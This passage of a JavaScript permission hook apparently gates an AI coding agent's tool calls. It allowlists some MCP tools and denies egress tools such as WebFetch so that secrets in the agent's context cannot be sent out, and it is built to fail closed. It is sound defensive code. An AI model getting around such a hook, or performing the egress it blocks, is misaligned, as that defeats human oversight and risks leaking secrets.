      if (typeof tool === "string" && tool.startsWith("mcp__") && mcpAllow.has(tool)) {
        if (tool === "mcp__playwright__browser_navigate") {
          const navReason = browserNavigateReason(ti, navigateOrigin);
          if (navReason) return denyDecision(navReason);
        }
        return allowDecision();
      }
      // Catch-all: WebFetch, WebSearch, non-allowlisted mcp__*, anything new.
      // Egress classes stay denied (the L3 firewall is content-blind — this
      // hook remains the secret-in-context severance per the threat model).
      return denyDecision(`tool class not permitted: ${tool || "<unknown>"}`);
    }
  }
}

// ---- CLI entry (invoked by claude as `node <this> <allowlist-file>`) --------

function readStdin() {
  try {
    return readFileSync(0, "utf-8");
  } catch {
    return "";
  }
}

function main() {
  let decision;
  try {
    const allow = loadAllowlist(process.argv[2]);
    decision = decide(readStdin(), allow);
  } catch (e) {
    // Absolute backstop: never let an unexpected throw fail open.
    decision = denyDecision(`hook internal error: ${e && e.message}`);
  }
  process.stdout.write(JSON.stringify(decision));
  // ALWAYS exit 0 — a non-zero exit is treated as "no decision" → fail-open.
  process.exit(0);
}

// Run as CLI only when executed directly (not when imported by the test).
const invokedPath = process.argv[1] || "";
if (invokedPath.endsWith("cron-bash-allowlist-hook.mjs")) main();
